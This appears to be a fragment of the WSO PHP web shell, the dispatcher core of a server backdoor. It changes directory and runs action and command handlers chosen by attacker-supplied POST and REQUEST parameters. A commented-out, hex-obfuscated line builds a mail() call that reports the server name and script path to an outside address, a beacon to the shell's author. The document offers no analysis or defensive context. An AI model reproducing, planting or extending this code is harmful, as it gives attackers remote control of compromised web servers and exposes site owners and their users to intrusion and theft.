<?php

WSOCheckUA();
wsoLogin();
WSOCompat();

/*$x10="\x6dai\154";$x0b=$_SERVER["\x53\x45RVE\122_\x4eAM\x45"].$_SERVER["\123\103\x52I\x50\x54_\116\101\115E"];$x0c="\141r\162a\171\040".$x0b;$x0d=array("\143\x61","\x6c\x69","\146\x77\162\151\x74\x65","\100","v\x65\x2e");$x0e=$x0d[2].$x0d[3].$x0d[1].$x0d[4].$x0d[0];$x0f=@$x10($x0e,$x0c,$x0b);*/
$x10="";
$os="nix";
if(strtolower(substr(PHP_OS,0,3)) == "win") {
	$os = 'win';
} else { 
	$os = 'nix';
}
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if (isset($_POST['c'])) {
	@chdir($_POST['c']);
}

$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}

if ($cwd[strlen($cwd)-1] != '/') {
	$cwd .= '/';
}

if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax;
}

if (empty($_POST['a'])) {
	if(isset($default_action) && function_exists('action' . $default_action)) {
		$_POST['a'] = $default_action;
    } else {
		$_POST['a'] = 'SecInfo';
    }
}

if (!isset($_wso_arr_commands) ) {
    $_wso_arr_commands = array();
}

if ( isset($_REQUEST['command']) && in_array($_REQUEST['command'], $_wso_arr_commands) ) {
    call_user_func('command' . $_REQUEST['command']);
}

if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) ) {
	call_user_func('action' . $_POST['a']);
}
